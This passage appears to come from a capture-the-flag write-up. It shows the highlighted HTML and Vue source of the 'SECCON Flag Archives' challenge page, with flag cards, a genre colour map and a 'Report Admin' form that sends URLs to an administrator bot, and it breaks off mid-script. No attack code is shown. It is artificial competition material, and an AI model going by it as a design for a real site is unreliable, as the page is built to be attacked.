class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>SECCON Flag Archives<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/bulmaswatch/nuclear/bulmaswatch.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">type</span>=<span class="string">"image/png"</span> <span class="attr">href</span>=<span class="string">"/favicon.png"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">padding</span>: <span class="selector-class">.75rem</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.contest-title</span> &#123;</span></span><br><span class="line">margin-top: 1rem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.contest-list</span> &gt; <span class="selector-class">.title</span> &#123;</span></span><br><span class="line">font-size: 12vmin;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.title</span><span class="selector-class">.padded</span> &#123;</span></span><br><span class="line">margin-top: 3rem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.contest</span> &#123;</span></span><br><span class="line">display: block;</span><br><span class="line"><span class="css"><span class="selector-tag">padding</span>: 0<span class="selector-class">.5rem</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.contest-name</span> &#123;</span></span><br><span class="line">margin-bottom: 0 !important;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.flag</span> &#123;</span></span><br><span class="line">font-family: monospace;</span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span>: 1<span class="selector-class">.6rem</span>;</span></span><br><span class="line">word-break: break-all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.flag-shaken</span> &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">animation</span>: <span class="selector-tag">shake</span> 0<span class="selector-class">.3s</span> <span class="selector-tag">linear</span> <span class="selector-tag">infinite</span>;</span></span><br><span class="line">display: inline-block;</span><br><span class="line"><span class="css"><span class="selector-tag">color</span>: <span class="selector-id">#444</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.flag-shaken</span><span class="selector-pseudo">:nth-child(3n)</span> &#123; <span class="attribute">animation-delay</span>: -<span class="number">0.05s</span>; &#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.flag-shaken</span><span class="selector-pseudo">:nth-child(3n+1)</span> &#123; <span class="attribute">animation-delay</span>: -<span class="number">0.15s</span>; &#125;</span></span><br><span class="line"><span class="css"><span class="keyword">@keyframes</span> shake &#123;</span></span><br><span class="line"><span class="css">0% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line"><span class="css">10% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">4px</span>, <span class="number">4px</span>) <span class="built_in">rotateZ</span>(<span class="number">4deg</span>) &#125;</span></span><br><span class="line"><span class="css">20% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">4px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line"><span class="css">30% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">4px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(-<span class="number">4deg</span>) &#125;</span></span><br><span class="line"><span class="css">40% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line"><span class="css">50% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">4px</span>, <span class="number">4px</span>) <span class="built_in">rotateZ</span>(<span class="number">4deg</span>) &#125;</span></span><br><span class="line"><span class="css">60% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line"><span class="css">70% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">4px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(-<span class="number">4deg</span>) &#125;</span></span><br><span class="line"><span class="css">80% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">4px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line"><span class="css">90% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">4px</span>, <span class="number">4px</span>) <span class="built_in">rotateZ</span>(-<span class="number">4deg</span>) &#125;</span></span><br><span class="line"><span class="css">100% &#123; <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0px</span>, <span class="number">0px</span>) <span class="built_in">rotateZ</span>(<span class="number">0deg</span>) &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar is-light"</span> <span class="attr">role</span>=<span class="string">"navigation"</span> <span class="attr">aria-label</span>=<span class="string">"main navigation"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-item"</span> @<span class="attr">click</span>=<span class="string">"goHome()"</span>&gt;</span>SECCON Flag Archives<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">role</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">"navbar-burger burger"</span></span></span><br><span class="line"><span class="tag"><span class="attr">aria-label</span>=<span class="string">"menu"</span></span></span><br><span class="line"><span class="tag"><span class="attr">aria-expanded</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">@<span class="attr">click</span>=<span class="string">"isActive = !isActive"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-menu"</span> <span class="attr">:class</span>=<span class="string">"&#123;'is-active': isActive&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-start"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-item"</span> @<span class="attr">click</span>=<span class="string">"goHome()"</span>&gt;</span></span><br><span class="line">Home</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-for</span>=<span class="string">"contest in contests"</span> <span class="attr">:key</span>=<span class="string">"contest.id"</span> <span class="attr">class</span>=<span class="string">"navbar-item"</span> @<span class="attr">click</span>=<span class="string">"goContest(contest.id)"</span>&gt;</span></span><br><span class="line">&#123;&#123;contest.name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"route === 'home'"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contest-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"title padded has-text-success has-text-centered"</span>&gt;</span>SECCON Flag Archives<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"subtitle has-text-centered has-text-grey-light"</span>&gt;</span>Complete list of the golden flags that appeared in the past SECCON CTFs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"columns"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"contest in contests"</span> <span class="attr">:key</span>=<span class="string">"contest.id"</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click</span>=<span class="string">"goContest(contest.id)"</span> <span class="attr">class</span>=<span class="string">"contest has-background-success has-text-centered"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title has-text-light contest-name is-size-3"</span>&gt;</span>&#123;&#123;contest.name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title has-text-light is-size-6"</span>&gt;</span>&#123;&#123;contest.count&#125;&#125; flags<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"has-text-centered"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click</span>=<span class="string">"goReport()"</span> <span class="attr">class</span>=<span class="string">"subtitle has-text-success"</span>&gt;</span></span><br><span class="line">Report Admin</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"route === 'report'"</span> <span class="attr">class</span>=<span class="string">"container has-text-centered"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"title padded has-text-success is-size-1"</span>&gt;</span>Report Admin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"subtitle has-text-grey-light"</span>&gt;</span></span><br><span class="line">If you found any glitches on this website, fill in the following form to report them.<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">The URL will be reviewed and the administrator will check it.</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/query"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label"</span>&gt;</span>URL<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"field has-addons"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control is-expanded"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input"</span> <span class="attr">type</span>=<span class="string">"url"</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">placeholder</span>=<span class="string">"http://spa.chal.seccon.jp:18364/*****"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"button is-link"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"route === 'contest'"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">progress</span> <span class="attr">v-if</span>=<span class="string">"isLoading"</span> <span class="attr">class</span>=<span class="string">"progress is-small is-primary"</span> <span class="attr">max</span>=<span class="string">"100"</span>&gt;</span><span class="tag">&lt;/<span class="name">progress</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title contest-title has-text-centered is-size-1"</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"subtitle has-text-centered is-size-3"</span>&gt;</span>&#123;&#123;start&#125;&#125; - &#123;&#123;end&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"columns is-centered"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag"><span class="attr">v-for</span>=<span class="string">"(link, title) in contest.links"</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">"column is-narrow has-text-centered"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag"><span class="attr">:href</span>=<span class="string">"link"</span></span></span><br><span class="line"><span class="tag"><span class="attr">target</span>=<span class="string">"_blank"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">&#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"subtitle is-size-5 has-text-centered"</span>&gt;</span>&#123;&#123;flagCount&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"columns is-multiline"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"&#123;genre, name, point, flag&#125; in flags"</span> <span class="attr">:key</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"column is-half is-info"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">&#123;&#123;name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">"point !== null"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">"point &lt;= 100"</span> <span class="attr">class</span>=<span class="string">"tag is-light"</span>&gt;</span></span><br><span class="line">&#123;&#123;point&#125;&#125;pts</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">"point &lt;= 200"</span> <span class="attr">class</span>=<span class="string">"tag is-success"</span>&gt;</span></span><br><span class="line">&#123;&#123;point&#125;&#125;pts</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">"point &lt;= 300"</span> <span class="attr">class</span>=<span class="string">"tag is-link"</span>&gt;</span></span><br><span class="line">&#123;&#123;point&#125;&#125;pts</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">"point &lt;= 400"</span> <span class="attr">class</span>=<span class="string">"tag is-warning"</span>&gt;</span></span><br><span class="line">&#123;&#123;point&#125;&#125;pts</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span> <span class="attr">class</span>=<span class="string">"tag is-danger"</span>&gt;</span></span><br><span class="line">&#123;&#123;point&#125;&#125;pts</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"flag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">"flag === null"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-for</span>=<span class="string">"i in 10"</span> <span class="attr">:key</span>=<span class="string">"i"</span> <span class="attr">class</span>=<span class="string">"flag-shaken"</span>&gt;</span>?<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">&#123;&#123;flag&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"has-text-right is-size-5"</span> <span class="attr">:style</span>=<span class="string">"&#123;color: getGenreColor(genre)&#125;"</span>&gt;</span></span><br><span class="line">&#123;&#123;genre&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.6.10"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> genreColors = <span class="keyword">new</span> <span class="built_in">Map</span>([</span></span><br><span class="line"><span class="actionscript">[<span class="string">'crypto'</span>, <span class="string">'#689F38'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'forensic'</span>, <span class="string">'#FF8F00'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'forensics'</span>, <span class="string">'#FF8F00'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'pwn'</span>, <span class="string">'#D32F2F'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'media'</span>, <span class="string">'#9C27B0'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'reversing'</span>, <span class="string">'#42A5F5'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'web'</span>, <span class="string">'#558B2F'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'binary'</span>, <span class="string">'#F57F17'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'programming'</span>, <span class="string">'#5D4037'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'exploit'</span>, <span class="string">'#1565C0'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'excercise'</span>, <span class="string">'#558B2F'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'stegano'</span>, <span class="string">'#424242'</span>],</span></span><br><span class="line"><span class="actionscript">[<span class="string">'unknown'</span>, <span class="string">'#777777'</span>],</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> getGenreColor = <span class="function">(<span class="params">genre</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span 